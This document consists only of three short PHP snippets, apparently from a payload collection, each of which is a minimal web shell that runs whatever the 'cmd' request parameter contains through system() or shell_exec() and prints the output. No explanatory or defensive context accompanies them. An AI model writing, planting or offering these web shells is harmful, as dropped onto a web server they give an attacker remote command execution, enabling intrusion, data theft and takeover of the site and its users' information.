```
<?php 
 if(isset($_REQUEST["cmd"])){ 
   echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "    </pre>"; die; }
?>
```

```
<?php
echo "<pre>" .shell_exec($_REQUEST["cmd"]); "</pre>"; 
?>
```

```
<?php echo '<pre>';  system($_GET['cmd']); '</pre>'; ?>
```